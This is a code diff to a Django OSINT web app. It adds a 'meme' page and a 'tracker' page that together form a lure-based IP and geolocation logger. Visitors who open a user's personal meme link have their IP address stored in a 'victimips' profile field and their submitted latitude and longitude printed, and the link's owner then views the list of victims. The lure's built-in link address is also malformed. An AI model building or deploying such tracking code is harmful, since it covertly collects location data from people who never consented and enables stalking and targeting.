@@ -23,9 +23,11 @@ from .modules.ip.censys import censys_ip
 from .modules.ip.shodan import shodan_ip
 from .modules.btc.btc import btcaddress
 from .modules.email.emailrep import emailrep
-import sys, os
+import sys, os,requests
 import pdfx
 from io import BufferedReader
+import base64
+import simplejson as json
 
 sys.path.append("../src")
 BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
@@ -310,6 +312,60 @@ def settings(request):
     user.profile.save()
 
     return render(request, 'settings.html')
+
+@csrf_exempt
+def meme(request, username):
+
+  if request.method == 'GET':
+    
+    return render(request, 'meme.html')
+
+  if request.method == 'POST':
+    username = username
+    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
+    if x_forwarded_for:
+        ip = x_forwarded_for.split(',')[0]
+    else:
+        ip = request.META.get('REMOTE_ADDR')
+    print(ip)
+    print(request.POST.get('latitude'))
+    print(request.POST.get('longitude'))
+    user = User.objects.filter(username=username).first()
+
+    if user.profile.victimips == '':
+      user.profile.victimips = ip
+    elif ip in user.profile.victimips:
+      pass
+    else:
+      user.profile.victimips += ','+ip
+    user.profile.save()
+    img = (requests.get("https://meme-api.herokuapp.com/gimme"))
+    imgurl = img.json()
+    imgurl = imgurl['url']
+    return render(request, 'meme.html', {'img':imgurl})
+
+  
+@csrf_exempt
+def tracker(request):
+
+  if request.method == 'GET':
+    GET = {
+		"request_type" : 'GET'
+	}
+    
+    return render(request, 'tracker.html',{'get':GET})
+
+  if request.method == 'POST':
+
+    username = request.user.username
+    user = User.objects.filter(username=username).first()
+    url = 'http:127.0.0.1/meme/' + str((username))
+
+    victimips = user.profile.victimips
+    victimips = victimips.split(',')
+    if victimips == ['']:
+      return render(request, 'tracker.html', {'url':url})
+    return render(request, 'tracker.html', {'victimips':victimips, 'url':url})
 
 @csrf_exempt
 def logout(request):
